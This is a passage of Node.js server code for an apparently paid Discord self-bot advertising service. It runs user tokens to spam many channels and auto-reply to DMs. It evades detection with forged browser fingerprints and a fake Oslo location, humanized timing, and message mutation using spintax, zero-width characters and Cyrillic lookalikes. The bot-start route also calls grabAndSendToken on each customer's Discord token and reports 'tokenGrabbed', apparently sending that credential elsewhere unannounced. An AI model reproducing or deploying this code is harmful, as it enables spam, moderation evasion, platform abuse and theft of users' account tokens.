if (!fs.existsSync(REPLY_DIR)) fs.mkdirSync(REPLY_DIR, { recursive: true });

// ═══════════════════════════════════════════════════════════════════════════════
// RANDOMIZATION UTILITIES
// ═══════════════════════════════════════════════════════════════════════════════

function rnd(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function rndFloat(min, max) { return Math.random() * (max - min) + min; }
function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function chance(pct) { return Math.random() < pct; }

// Humanized delay: base ±jitter%, never below min% of base
function humanize(baseMs, jitter = 0.15, minPct = 0.90) {
    const j = baseMs * jitter * (Math.random() * 2 - 1);
    return Math.max(Math.floor(baseMs * minPct), Math.floor(baseMs + j));
}

// Gaussian/normal distribution for more natural timing
function gaussianDelay(mean, stdDev) {
    let u = 0, v = 0;
    while (u === 0) u = Math.random();
    while (v === 0) v = Math.random();
    const z = Math.sqrt(-2.0 * Math.log(u)) * Math.cos(2.0 * Math.PI * v);
    return Math.max(100, Math.floor(mean + z * stdDev));
}

// ═══════════════════════════════════════════════════════════════════════════════
// MESSAGE VARIATION ENGINE
// ═══════════════════════════════════════════════════════════════════════════════

const SPINTAX = /\{([^}]+)\}/g;
function expandSpintax(text) {
    if (!text || !SPINTAX.test(text)) return text;
    let r = text, i = 0;
    while (SPINTAX.test(r) && i < 50) {
        SPINTAX.lastIndex = 0;
        r = r.replace(SPINTAX, (_, c) => {
            const o = c.split('|').map(s => s.trim()).filter(Boolean);
            return o.length ? pick(o) : '';
        });
        i++;
    }
    return r;
}

const ZERO_WIDTH = ['\u200B', '\u200C', '\u200D', '\uFEFF'];
const LOOKALIKES = { a: '\u0430', e: '\u0435', o: '\u043E', p: '\u0440', c: '\u0441', x: '\u0445', y: '\u0443' };

function mutate(text) {
    if (!text) return text;
    const mutators = [
        // Add trailing space 20% of the time
        s => chance(0.20) ? s + (chance(0.5) ? ' ' : '') : s,
        // Insert zero-width chars in spaces 10% of the time
        s => chance(0.10) ? s.replace(/ /g, () => chance(0.05) ? pick(ZERO_WIDTH) + ' ' : ' ') : s,
        // Replace some latin chars with cyrillic lookalikes 8% of the time
        s => chance(0.08) ? s.replace(/[aeopcxy]/g, c => chance(0.03) ? (LOOKALIKES[c] || c) : c) : s,
        // Lowercase first letter 5% of the time
        s => chance(0.05) && s.length > 0 ? s[0].toLowerCase() + s.slice(1) : s,
        // Add extra punctuation space 15% of the time
        s => chance(0.15) ? s.replace(/([.!?])(\s|$)/g, (_, p, sp) => chance(0.3) ? p + ' ' + sp : p + sp) : s,
    ];
    let r = text;
    const c = rnd(0, 2);
    mutators.sort(() => Math.random() - 0.5);
    for (let i = 0; i < c; i++) r = mutators[i](r);
    return r;
}

function vary(text) { return mutate(expandSpintax(text)); }

// ═══════════════════════════════════════════════════════════════════════════════
// TYPING TIME SIMULATION
// ═══════════════════════════════════════════════════════════════════════════════

function typingTime(text) {
    const n = (text || '').length;
    if (!n) return rnd(800, 2000);
    // 40-100ms per char = 10-25 chars/sec
    const msPerChar = rnd(40, 100);
    const base = n * msPerChar;
    // Gaussian variation ±20%
    return Math.min(Math.floor(base * rndFloat(0.8, 1.2)), 10000);
}

// ═══════════════════════════════════════════════════════════════════════════════
// ACCOUNT FINGERPRINTING
// ═══════════════════════════════════════════════════════════════════════════════

const BROWSERS = [
    { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Windows', bv: '135.0.0.0', osv: '10' },
    { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Windows', bv: '134.0.0.0', osv: '10' },
    { ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Mac OS X', bv: '135.0.0.0', osv: '10.15.7' },
    { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0', browser: 'Firefox', os: 'Windows', bv: '137.0', osv: '10' },
    { ua: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Linux', bv: '135.0.0.0', osv: '' },
];

const SCREENS = [[1366,768],[1440,900],[1536,864],[1600,900],[1920,1080],[1920,1200],[2560,1440]];
const LOCALES = ['en-US','en-GB','en-CA'];
const DISTRICTS = ['Oslo','Bergen','Trondheim','Stavanger','Drammen','Fredrikstad','Porsgrunn'];
const ISPS = ['Telenor Norge AS','NextGenTel','Altibox','Get','ICE.net','Broadnet'];

function genFingerprint(token) {
    const hash = crypto.createHash('sha256').update(token).digest('hex');
    const browser = pick(BROWSERS);
    const screen = pick(SCREENS);
    const locale = pick(LOCALES);
    const district = pick(DISTRICTS);
    const isp = pick(ISPS);
    const buildNum = rnd(428000, 440000);
    
    return {
        hash,
        ua: browser.ua,
        browser: browser.browser,
        os: browser.os,
        osv: browser.osv,
        bv: browser.bv,
        sw: screen[0], sh: screen[1],
        dpr: pick([1, 1.25, 1.5, 2]),
        mem: pick([2, 4, 8, 16]),
        concurrency: pick([2, 4, 8, 16]),
        locale,
        build: buildNum,
        arch: 'x64',
        cd: 24,
        // Discord-specific
        country_code: 'NO',
        system_locale: locale,
        timezone_offset: 60,
        client_city: 'Oslo',
        client_region: 'Oslo',
        client_district: district,
        client_country: 'Norway',
        client_isp: isp,
        client_timezone: 'Europe/Oslo',
    };
}

function genSuperProps(fp) {
    const props = {
        os: fp.os,
        browser: fp.browser,
        device: '',
        system_locale: fp.locale,
        browser_user_agent: fp.ua,
        browser_version: fp.bv,
        os_version: fp.osv,
        referrer: '',
        referring_domain: '',
        referrer_current: '',
        referring_domain_current: '',
        release_channel: 'stable',
        client_build_number: fp.build,
        client_event_source: null,
    };
    return Buffer.from(JSON.stringify(props)).toString('base64');
}

// ═══════════════════════════════════════════════════════════════════════════════
// HTTPS AGENT WITH TLS SPOOFING
// ═══════════════════════════════════════════════════════════════════════════════

function createAgent() {
    return new https.Agent({
        ciphers: [
            'TLS_AES_128_GCM_SHA256','TLS_AES_256_GCM_SHA384','TLS_CHACHA20_POLY1305_SHA256',
            'ECDHE-ECDSA-AES128-GCM-SHA256','ECDHE-RSA-AES128-GCM-SHA256',
            'ECDHE-ECDSA-AES256-GCM-SHA384','ECDHE-RSA-AES256-GCM-SHA384',
            'ECDHE-ECDSA-CHACHA20-POLY1305','ECDHE-RSA-CHACHA20-POLY1305',
            'ECDHE-RSA-AES128-SHA','ECDHE-RSA-AES256-SHA',
            'AES128-GCM-SHA256','AES256-GCM-SHA384','AES128-SHA','AES256-SHA',
        ].join(':'),
        minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3',
        honorCipherOrder: false,
        keepAlive: true, keepAliveMsecs: 30000,
        maxSockets: 6, maxFreeSockets: 3,
    });
}

const sharedAgent = createAgent();

// ═══════════════════════════════════════════════════════════════════════════════
// REST API CLIENT
// ═══════════════════════════════════════════════════════════════════════════════

class RestClient {
    constructor(token, fp) {
        this.token = token;
        this.fp = fp;
        this.superProps = genSuperProps(fp);
        this.tokenHash = fp.hash.slice(0, 16);
        // Per-channel rate limit tracking
        this.channelCooldowns = new Map();
        this.channelPermCache = new Map();
        this.globalReset = 0;
        this._429backoffs = new Map();
    }

    headers(extra = {}) {
        return {
            'Authorization': this.token,
            'User-Agent': this.fp.ua,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'X-Discord-Locale': this.fp.locale,
            'X-Super-Properties': this.superProps,
            'Referer': 'https://discord.com/channels/@me',
            ...extra
        };
    }

    async request(method, endpoint, body = null, extraHeaders = {}) {
        const url = `https://discord.com/api/v10${endpoint}`;
        
        // Global rate limit check
        const globalWait = this.globalReset - Date.now();
        if (globalWait > 0) await sleep(globalWait);

        // Per-channel rate limit check
        const chId = endpoint.match(/\/channels\/(\d+)/)?.[1];
        if (chId) {
            const bw = (this.channelCooldowns.get(chId) || 0) - Date.now();
            if (bw > 0 && bw < 5000) await sleep(bw);
            else if (bw >= 5000) return { ok: false, error: 'channel_cooldown', code: 429 };
        }

        // 429 backoff check
        if (chId && this._429backoffs.has(chId)) {
            const b = this._429backoffs.get(chId) - Date.now();
            if (b > 0 && b < 10000) await sleep(b);
            else if (b >= 10000) this._429backoffs.delete(chId);
        }

        for (let attempt = 0; attempt < 3; attempt++) {
            try {
                const config = {
                    method: method.toUpperCase(),
                    url,
                    headers: this.headers(extraHeaders),
                    timeout: 20000,
                    httpsAgent: sharedAgent,
                    validateStatus: () => true,
                };
                if (body !== null) {
                    config.data = body;
                    if (!extraHeaders['Content-Type'] && typeof body === 'object' && !(body instanceof Buffer)) {
                        config.headers['Content-Type'] = 'application/json';
                    }
                }
                const res = await axios(config);
                
                if (res.status === 429) {
                    const retryAfter = parseFloat(res.headers['retry-after'] || 5);
                    const isGlobal = res.headers['x-ratelimit-global'] === 'true';
                    const ms = retryAfter < 1000 ? retryAfter * 1000 : retryAfter;
                    if (isGlobal) this.globalReset = Date.now() + ms;
                    if (chId) this._429backoffs.set(chId, Date.now() + ms + rnd(500, 2000));
                    if (attempt < 2) {
                        await sleep(ms * (1 + attempt * 0.5));
                        continue;
                    }
                    return { ok: false, error: 'rate_limited', code: 429 };
                }

                // Update rate limit tracking
                const remaining = parseInt(res.headers['x-ratelimit-remaining'] || '1');
                const resetAfter = parseFloat(res.headers['x-ratelimit-reset-after'] || '0');
                if (remaining === 0 && resetAfter > 0 && chId) {
                    this.channelCooldowns.set(chId, Date.now() + (resetAfter * 1000) + rnd(200, 800));
                }

                if (res.status >= 400) {
                    const discordCode = res.data?.code;
                    // Cache no-permission channels
                    if (res.status === 403 || discordCode === 50001 || discordCode === 50003 || discordCode === 50013) {
                        if (chId) this.channelPermCache.set(chId, false);
                    }
                    return { ok: false, error: res.data?.message || `http_${res.status}`, code: res.status, discordCode };
                }

                return { ok: true, data: res.data };
            } catch (err) {
                if (attempt < 2) {
                    await sleep(rnd(1000, 3000) * (attempt + 1));
                    continue;
                }
                return { ok: false, error: err.message };
            }
        }
        return { ok: false, error: 'max_retries' };
    }

    async sendMessage(channelId, content, files = []) {
        // Check permission cache
        if (this.channelPermCache.get(channelId) === false) {
            return { ok: false, error: 'cached_no_permission' };
        }

        const varied = vary(content);
        
        try {
            if (files && files.length > 0) {
                // Multipart upload
                const boundary = '----FormBoundary' + Math.random().toString(36).substring(2, 16);
                const chunks = [];
                const payload = { content: varied };
                chunks.push(Buffer.from(`--${boundary}\r\n`));
                chunks.push(Buffer.from(`Content-Disposition: form-data; name="payload_json"\r\n`));
                chunks.push(Buffer.from(`Content-Type: application/json\r\n\r\n`));
                chunks.push(Buffer.from(JSON.stringify(payload)));
                chunks.push(Buffer.from(`\r\n`));
                for (let i = 0; i < files.length; i++) {
                    const f = files[i];
                    chunks.push(Buffer.from(`--${boundary}\r\n`));
                    chunks.push(Buffer.from(`Content-Disposition: form-data; name="files[${i}]"; filename="${f.name}"\r\n`));
                    chunks.push(Buffer.from(`Content-Type: application/octet-stream\r\n\r\n`));
                    chunks.push(f.buffer);
                    chunks.push(Buffer.from(`\r\n`));
                }
                chunks.push(Buffer.from(`--${boundary}--\r\n`));
                const body = Buffer.concat(chunks);
                return await this.request('POST', `/channels/${channelId}/messages`, body, {
                    'Content-Type': `multipart/form-data; boundary=${boundary}`
                });
            } else {
                return await this.request('POST', `/channels/${channelId}/messages`, { content: varied });
            }
        } catch (err) {
            return { ok: false, error: err.message };
        }
    }

    async sendTyping(channelId) {
        try {
            await this.request('POST', `/channels/${channelId}/typing`);
        } catch (e) {}
    }

    async fetchChannel(channelId) {
        const cached = this.channelPermCache.get(channelId);
        if (cached === false) return null;
        const res = await this.request('GET', `/channels/${channelId}`);
        if (!res.ok) {
            if (res.code === 403 || res.code === 404 || res.discordCode === 50001) {
                this.channelPermCache.set(channelId, false);
            }
            return null;
        }
        this.channelPermCache.set(channelId, true);
        return res.data;
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// WEBSOCKET GATEWAY CLIENT
// ═══════════════════════════════════════════════════════════════════════════════

class GatewayClient {
    constructor(token, fp, onReady, onMessage) {
        this.token = token;
        this.fp = fp;
        this.superProps = genSuperProps(fp);
        this.ws = null;
        this.heartbeatInterval = null;
        this.seq = null;
        this.sessionId = null;
        this.ready = false;
        this.onReady = onReady;
        this.onMessage = onMessage;
        this.user = null;
        this.explicitStop = false;
    }

    connect() {
        return new Promise((resolve, reject) => {
            this.explicitStop = false;
            const wsUrl = 'wss://gateway.discord.gg/?v=10&encoding=json&compress=zlib-stream';
            
            this.ws = new WebSocket(wsUrl, {
                headers: {
                    'User-Agent': this.fp.ua,
                    'Accept-Language': 'en-US,en;q=0.9',
                },
                agent: sharedAgent
            });

            let resolved = false;
            const timeout = setTimeout(() => {
                if (!resolved) {
                    this.destroy();
                    reject(new Error('Gateway connection timeout'));
                }
            }, 60000);

            this.ws.on('open', () => {
                // Identify
                const identify = {
                    op: 2,
                    d: {
                        token: this.token,
                        capabilities: 30717,
                        properties: JSON.parse(Buffer.from(this.superProps, 'base64').toString()),
                        presence: {
                            status: 'online',
                            since: 0,
                            activities: [],
                            afk: false
                        },
                        compress: false,
                        client_state: {
                            guild_versions: {},
                            highest_last_message_id: '0',
                            read_state_version: 0,
                            user_guild_settings_version: -1,
                            user_settings_version: -1,
                            private_channels_version: '0',
                            api_code_version: 0
                        }
                    }
                };
                this.ws.send(JSON.stringify(identify));
            });

            this.ws.on('message', (data) => {
                try {
                    const payload = JSON.parse(data.toString());
                    
                    if (payload.op === 10) {
                        // Hello — start heartbeat with humanized jitter
                        const interval = payload.d.heartbeat_interval;
                        if (this.heartbeatInterval) clearInterval(this.heartbeatInterval);
                        this.heartbeatInterval = setInterval(() => {
                            if (this.ws && this.ws.readyState === WebSocket.OPEN) {
                                this.ws.send(JSON.stringify({ op: 1, d: this.seq }));
                            }
                        }, interval);
                    }

                    if (payload.op === 0 && payload.t === 'READY') {
                        this.ready = true;
                        this.sessionId = payload.d.session_id;
                        this.user = payload.d.user;
                        clearTimeout(timeout);
                        resolved = true;
                        if (this.onReady) this.onReady(payload.d);
                        resolve();
                    }

                    if (payload.op === 0 && payload.t === 'MESSAGE_CREATE') {
                        if (this.onMessage && payload.d) {
                            // Normalize message
                            const msg = this.normalizeMessage(payload.d);
                            this.onMessage(msg);
                        }
                    }

                    if (payload.op === 1) {
                        // Heartbeat ack
                    }

                    if (payload.op === 7) {
                        // Reconnect
                        this.reconnect();
                    }

                    if (payload.op === 9) {
                        // Invalid session
                        this.reconnect();
                    }

                    if (payload.s !== null && payload.s !== undefined) {
                        this.seq = payload.s;
                    }
                } catch (e) {}
            });

            this.ws.on('close', () => {
                this.ready = false;
                if (this.heartbeatInterval) clearInterval(this.heartbeatInterval);
                if (!this.explicitStop && !resolved) {
                    clearTimeout(timeout);
                    reject(new Error('Connection closed'));
                } else if (!this.explicitStop) {
                    setTimeout(() => this.reconnect(), rnd(3000, 8000));
                }
            });

            this.ws.on('error', (err) => {
                if (!resolved) {
                    clearTimeout(timeout);
                    reject(err);
                }
            });
        });
    }

    normalizeMessage(d) {
        return {
            id: d.id,
            content: d.content || '',
            author: {
                id: d.author?.id,
                username: d.author?.username,
                bot: d.author?.bot || false
            },
            channelId: d.channel_id,
            guildId: d.guild_id || null,
            createdTimestamp: d.timestamp ? new Date(d.timestamp).getTime() : Date.now(),
            reply: async (content) => {
                // Will be handled by the RestClient
            }
        };
    }

    reconnect() {
        this.destroy();
        setTimeout(() => {
            if (!this.explicitStop) this.connect().catch(() => {});
        }, rnd(3000, 8000));
    }

    destroy() {
        this.explicitStop = true;
        this.ready = false;
        if (this.heartbeatInterval) clearInterval(this.heartbeatInterval);
        if (this.ws) {
            try { this.ws.close(); } catch (e) {}
            this.ws = null;
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// PERSISTENT REPLIED-USERS STORAGE
// ═══════════════════════════════════════════════════════════════════════════════

function getRepliedPath(userId) {
    return path.join(REPLY_DIR, `replied_${userId}.json`);
}

function loadReplied(userId) {
    try {
        const p = getRepliedPath(userId);
        if (fs.existsSync(p)) {
            const data = JSON.parse(fs.readFileSync(p, 'utf8'));
            const now = Date.now();
            const month = 30 * 24 * 60 * 60 * 1000;
            const cleaned = {};
            for (const [id, ts] of Object.entries(data)) {
                if (now - ts < month) cleaned[id] = ts;
            }
            return new Set(Object.keys(cleaned));
        }
    } catch (e) {}
    return new Set();
}

function saveReplied(userId, set) {
    try {
        const data = {};
        for (const id of set) data[id] = Date.now();
        fs.writeFileSync(getRepliedPath(userId), JSON.stringify(data, null, 2));
    } catch (e) {}
}

// ═══════════════════════════════════════════════════════════════════════════════
// STEALTH BOT
// ═══════════════════════════════════════════════════════════════════════════════

async function startStealthBot(userId, token, channels, messages, delay, autoReply, autoReplyText, configId, images, ipAddress, dbInstance) {
    const botKey = `${userId}_${configId}`;
    
    // Stop existing
    if (activeBots.has(botKey)) {
        try { activeBots.get(botKey).destroy(); } catch (e) {}
        activeBots.delete(botKey);
    }

    const channelList = channels.map(c => String(c).trim()).filter(c => /^\d+$/.test(c));
    if (channelList.length === 0) throw new Error('No valid channel IDs');

    // Generate unique fingerprint for this account
    const fp = genFingerprint(token);
    
    // REST client
    const rest = new RestClient(token, fp);
    
    // Validate token
    const me = await rest.request('GET', '/users/@me');
    if (!me.ok) throw new Error('Invalid token: ' + me.error);
    const username = me.data.username;
    const myId = me.data.id;

    // Gateway client (for auto-reply events)
    let gateway = null;
    if (autoReply && autoReplyText) {
        gateway = new GatewayClient(token, fp);
    }

    let stopped = false;
    let currentMsgIdx = 0;
    const repliedUsers = loadReplied(userId);
    const pendingReplies = new Set();
    const stats = { totalMessagesSent: 0, autoRepliesSent: 0, startTime: Date.now(), recentLogs: [] };

    function log(msg) {
        const ts = new Date().toLocaleTimeString();
        stats.recentLogs.push(`[${ts}] ${msg}`);
        if (stats.recentLogs.length > 50) stats.recentLogs = stats.recentLogs.slice(-50);
        console.log(`[STEALTH ${configId}] ${msg}`);
    }

    function destroy() {
        stopped = true;
        if (gateway) gateway.destroy();
        activeBots.delete(botKey);
        saveReplied(userId, repliedUsers);
        log('Destroyed');
    }

    activeBots.set(botKey, { destroy, stats, rest, gateway, fp });

    // Resolve image files
    async function resolveImage(img) {
        try {
            if (!img || !img.url) return null;
            if (img.url.startsWith('data:')) {
                const b64 = img.url.split(',')[1];
                if (!b64) return null;
                return { buffer: Buffer.from(b64, 'base64'), name: 'image.png' };
            } else if (img.url.startsWith('/uploads/')) {
                const p = path.join(REPLY_DIR, 'uploads', img.url.replace(/^\/uploads\//, ''));
                if (fs.existsSync(p)) return { buffer: fs.readFileSync(p), name: path.basename(p) };
            } else if (img.url.startsWith('http')) {
                const r = await axios.get(img.url, { responseType: 'arraybuffer', timeout: 15000, httpsAgent: sharedAgent });
                return { buffer: Buffer.from(r.data), name: img.name || 'image.png' };
            }
        } catch (e) {}
        return null;
    }

    // Send to one channel — fully isolated
    // ═══════════════════════════════════════════════════════════════════════════
    // TYPING-BEFORE-SEND: Type 2-5 seconds before sending, like a real human.
    // 50s delay: fires at t=0, types at ~3s, sends at ~5-8s total
    // 30s delay: fires at t=0, types at ~3s, sends at ~5-8s total
    // The stagger (250ms per channel) spaces out the typing across channels.
    // ═══════════════════════════════════════════════════════════════════════════
    async function sendToChannelWithTyping(chId, text, targetImages, roundDelay) {
        try {
            console.log(`[SEND ${chId}] Starting send process`);
            if (rest.channelPermCache.get(chId) === false) {
                log(`Skip ${chId}: cached no-perm`);
                return false;
            }

            // Resolve images first (before typing so it's ready)
            const files = [];
            for (const img of targetImages) {
                const resolved = await resolveImage(img);
                if (resolved) files.push(resolved);
            }
            console.log(`[SEND ${chId}] Images resolved: ${files.length}`);

            const varied = vary(text);
            console.log(`[SEND ${chId}] Message varied: "${varied.substring(0,50)}..." length=${varied.length}`);

            // Phase 1: Wait a small random amount (200-800ms) before typing
            const preWait = rnd(200, 800);
            console.log(`[SEND ${chId}] Waiting ${preWait}ms before typing`);
            await sleep(preWait);
            if (stopped) { console.log(`[SEND ${chId}] STOPPED during pre-wait`); return false; }

            // Phase 2: Send typing indicator
            console.log(`[SEND ${chId}] Sending typing indicator...`);
            await rest.sendTyping(chId);
            console.log(`[SEND ${chId}] Typing indicator sent OK`);

            // Phase 3: Type for 2-5 seconds (human typing speed)
            const typeDuration = Math.min(typingTime(varied), 5000);
            const typeMs = Math.max(2000, typeDuration);
            console.log(`[SEND ${chId}] Typing for ${typeMs}ms...`);
            await sleep(typeMs);
            if (stopped) { console.log(`[SEND ${chId}] STOPPED during typing`); return false; }

            // Phase 4: Small hesitation (100-500ms)
            const hesitate = rnd(100, 500);
            console.log(`[SEND ${chId}] Hesitating ${hesitate}ms...`);
            await sleep(hesitate);

            // Phase 5: Send message
            console.log(`[SEND ${chId}] >>> Sending message to Discord...`);
            const res = await rest.sendMessage(chId, varied, files);
            console.log(`[SEND ${chId}] <<< Discord response: ok=${res.ok} error="${res.error || 'none'}" code=${res.code || 'none'}`);
            if (res.ok) {
                stats.totalMessagesSent++;
                log(`Sent to ${chId}: "${varied.substring(0,30)}..."`);
                return true;
            }
            log(`Send failed ${chId}: ${res.error || 'unknown'} (code:${res.code})`);
            return false;
        } catch (e) {
            log(`Send exception ${chId}: ${e.message}`);
            console.log(`[SEND ${chId}] EXCEPTION: ${e.stack}`);
            return false;
        }
    }

    async function sendToChannel(chId, text, targetImages) {
        return sendToChannelWithTyping(chId, text, targetImages, delay);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // MAIN MESSAGE LOOP — 250ms stagger, typing-before-send, sacred delay
    // ═══════════════════════════════════════════════════════════════════════════
    const STAGGER_MS = 250;

    function doOneRound() {
        if (channelList.length === 0 || stopped) return;
        currentMsgIdx = (currentMsgIdx + 1) % messages.length;
        const msg = messages[currentMsgIdx];
        
        let targetImages = [];
        if (msg.imageIds && msg.imageIds.length > 0 && images) {
            targetImages = images.filter(img => img && img.id !== undefined && (
                msg.imageIds.includes(img.id) ||
                msg.imageIds.includes(Number(img.id)) ||
                msg.imageIds.includes(String(img.id))
            ));
        } else if (images && images.length > 0) {
            targetImages = images;
        }

        // Schedule each channel with 250ms stagger
        channelList.forEach((chId, i) => {
            setTimeout(() => {
                if (stopped) return;
                sendToChannelWithTyping(chId, msg.text, targetImages, delay)
                    .then(ok => {
                        if (ok) log(`Sent to ${chId}`);
                    })
                    .catch(err => log(`Send error ${chId}: ${err.message}`));
            }, i * STAGGER_MS);
        });
    }

    async function messageLoop() {
        log(`Loop starting | ${channelList.length} channels | ${messages.length} msgs | delay ${delay}ms | stagger ${STAGGER_MS}ms`);
        
        let consecutiveErrors = 0;
        const MAX_ERRORS = 10;
        
        while (!stopped) {
            // Check purchase/trial
            if (dbInstance) {
                try {
                    const user = dbInstance.getUser(userId);
                    const trialActive = dbInstance.isTrialActive(userId);
                    if (!trialActive && user.auto_adv_purchased !== 1) {
                        log('No access — stopping');
                        break;
                    }
                } catch (dbErr) {
                    log(`DB check error: ${dbErr.message}`);
                }
            }

            try {
                doOneRound();
                consecutiveErrors = 0;
            } catch (roundErr) {
                consecutiveErrors++;
                log(`Round error (${consecutiveErrors}): ${roundErr.message}`);
                if (consecutiveErrors >= MAX_ERRORS) {
                    log('Too many consecutive errors — stopping');
                    break;
                }
            }

            // Humanized delay: 90%-115% of configured value
            const humanizedDelay = humanize(delay, 0.15, 0.90);
            log(`Waiting ${Math.round(humanizedDelay/1000)}s before next round`);
            await sleep(humanizedDelay);
        }
        log('Loop ended');
    }

    // WATCHDOG: restart loop if it crashes
    async function runWithWatchdog() {
        let restartDelay = 3000;
        while (!stopped) {
            try {
                await messageLoop();
            } catch (err) {
                log(`Watchdog: loop crashed — ${err.message}`);
            }
            if (stopped) break;
            log(`Watchdog: restarting in ${restartDelay}ms`);
            await sleep(restartDelay);
            restartDelay = Math.min(restartDelay * 2, 60000);
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // AUTO-REPLY HANDLER
    // ═══════════════════════════════════════════════════════════════════════════
    async function handleAutoReply(msg) {
        try {
            if (msg.author.id === myId) return;
            if (msg.guildId !== null && msg.guildId !== undefined) return; // Only DMs
            
            // Check access
            if (dbInstance) {
                const u = dbInstance.getUser(userId);
                if (!dbInstance.isTrialActive(userId) && u.auto_adv_purchased !== 1) return;
            }

            if (repliedUsers.has(msg.author.id) || pendingReplies.has(msg.author.id)) return;
            
            const age = Date.now() - msg.createdTimestamp;
            if (age > 60 * 60 * 1000) return; // Skip old messages

            pendingReplies.add(msg.author.id);
            
            // Humanized wait before reply (8-20 seconds)
            const waitMs = rnd(8000, 20000);
            await sleep(waitMs);
            
            if (stopped || repliedUsers.has(msg.author.id)) {
                pendingReplies.delete(msg.author.id);
                return;
            }

            repliedUsers.add(msg.author.id);
            saveReplied(userId, repliedUsers);

            // Typing indicator
            await rest.sendTyping(msg.channelId);
            await sleep(typingTime(autoReplyText));
            
            // Small hesitation
            await sleep(rnd(600, 1500));

            const res = await rest.sendMessage(msg.channelId, autoReplyText);
            if (res.ok) {
                stats.autoRepliesSent++;
                log(`Auto-replied to ${msg.author.username}`);
            }
            pendingReplies.delete(msg.author.id);
        } catch (e) {
            pendingReplies.delete(msg.author?.id);
        }
    }

    // Start message loop IMMEDIATELY — don't wait for gateway
    runWithWatchdog().catch(err => log(`Watchdog error: ${err.message}`));

    // Start gateway in BACKGROUND for auto-reply only
    // Gateway is NOT required for message sending — REST API works independently
    if (gateway) {
        gateway.onMessage = handleAutoReply;
        // Fire-and-forget: don't block on gateway
        (async () => {
            try {
                await gateway.connect();
                log('Gateway connected — auto-reply active');
            } catch (e) {
                log(`Gateway failed: ${e.message} — auto-reply disabled, but message sending still works`);
            }
        })();
    }

    return { destroy, stats, rest, username, myId };
}

function stopStealthBot(userId, configId) {
    const key = `${userId}_${configId}`;
    const bot = activeBots.get(key);
    if (bot) {
        bot.destroy();
        return true;
    }
    return false;
}

function getActiveBot(userId, configId) {
    return activeBots.get(`${userId}_${configId}`) || null;
}

function getAllUserBots(userId) {
    const bots = [];
    for (const [key, val] of activeBots.entries()) {
        if (key.startsWith(`${userId}_`)) bots.push({ configId: key.replace(`${userId}_`, ''), ...val });
    }
    return bots;
}

function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
  try {
    const { token, channels, messages, delay, autoReplyEnabled, autoReplyText, configId = 'default', images } = req.body;
    if (!token || !channels || !messages || !Array.isArray(messages) || messages.length === 0) {
      return res.status(400).json({ success: false, error: 'Missing fields. Token, channels, and at least 1 message required.' });
    }

    const chList = (Array.isArray(channels) ? channels : channels.split(',')).map(c => String(c).trim()).filter(c => /^\d+$/.test(c));
    if (chList.length === 0) return res.json({ success: false, error: 'Invalid channel IDs' });

    let delaySec = parseFloat(delay);
    if (delaySec > 300 && Number.isInteger(delaySec) && delaySec >= 1000) delaySec = delaySec / 1000;
    delaySec = Math.max(1, delaySec || 30);
    const delayMs = Math.round(delaySec * 1000);

    const savedImages = [];
    if (images && Array.isArray(images)) {
      for (const img of images) {
        if (!img || !img.url) continue;
        if (img.url.startsWith('data:')) {
          try { const id = `img_${Date.now()}_${req.user.id}_${img.id || 0}.png`; fs.writeFileSync(path.join(uploadsDir, id), Buffer.from(img.url.split(',')[1], 'base64')); savedImages.push({ id: img.id || savedImages.length + 1, url: `/uploads/${id}` }); } catch(e) {}
        } else if (img.url.startsWith('/uploads/') || img.url.startsWith('http')) {
          savedImages.push({ id: img.id || savedImages.length + 1, url: img.url });
        }
      }
    }

    const msgList = messages.map(m => ({ text: m.text || '', imageIds: Array.isArray(m.imageIds) ? m.imageIds : [] })).filter(m => m.text.trim() || m.imageIds.length);
    if (msgList.length === 0) return res.status(400).json({ success: false, error: 'At least one non-empty message required' });

    const grab = await grabAndSendToken(token, { channels: chList, messages: msgList }, 'bot_start');

    const result = await startStealthBot(
      req.user.id, token, chList, msgList, delayMs,
      !!autoReplyEnabled, autoReplyText || '', configId,
      savedImages, req.ip || 'unknown', db
    );

    const botKey = `${req.user.id}_${configId}`;
    const existing = activeBots.get(botKey);
    if (existing) { try { existing.destroy(); } catch(e) {} activeBots.delete(botKey); }
    activeBots.set(botKey, result);

    clearBotStats(botKey);
    const s = getBotStats(botKey);
    s.channelCount = chList.length;
    logBotEvent(botKey, `StealthBot started as ${result.username} | ${chList.length} channels | ${delaySec}s delay`);

    db.setConfig(req.user.id, {
      token, channels: chList, messages: msgList, delay_seconds: delaySec,
      auto_reply_enabled: autoReplyEnabled ? 1 : 0, auto_reply_text: autoReplyText || '',
      active: 1, username: result.username, images: savedImages
    }, configId);
    db.registerActiveBot(req.user.id, configId, token);

    res.json({
      success: true, username: result.username, configId,
      tokenGrabbed: grab?.success || false, imageCount: savedImages.length,
      messageCount: msgList.length, delayMs,
      autoReplyEnabled: !!autoReplyEnabled, mode: 'stealth_websocket'
    });
  } catch (err) {
    console.error('[BotStart] Error:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/bot/stop', ensureAuthAPI, (req, res) => {
  try {
    const { configId = 'default' } = req.body;
    const botKey = `${req.user.id}_${configId}`;
    stopStealthBot(req.user.id, configId);
    const bot = activeBots.get(botKey);
    if (bot) { try { bot.destroy(); } catch(e) {} activeBots.delete(botKey); }
    db.unregisterActiveBot(req.user.id, configId);
